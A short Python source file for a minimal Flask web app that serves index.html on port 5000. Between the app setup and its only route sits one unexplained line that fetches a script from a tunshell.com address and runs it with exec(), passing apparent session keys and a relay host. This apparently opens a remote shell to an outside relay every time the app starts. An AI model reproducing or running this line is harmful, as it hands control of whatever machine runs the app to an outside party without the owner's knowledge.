from flask import Flask, render_template

app = Flask(__name__)

import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","pFGejey77ySXqsUUDMtsGO","8ILdYVjgKgzzKd9dEZH1iO","au.relay.tunshell.com"]})

@app.route('/')
def index():
  return render_template('index.html')

if __name__ == '__main__':
  app.run(port=5000)
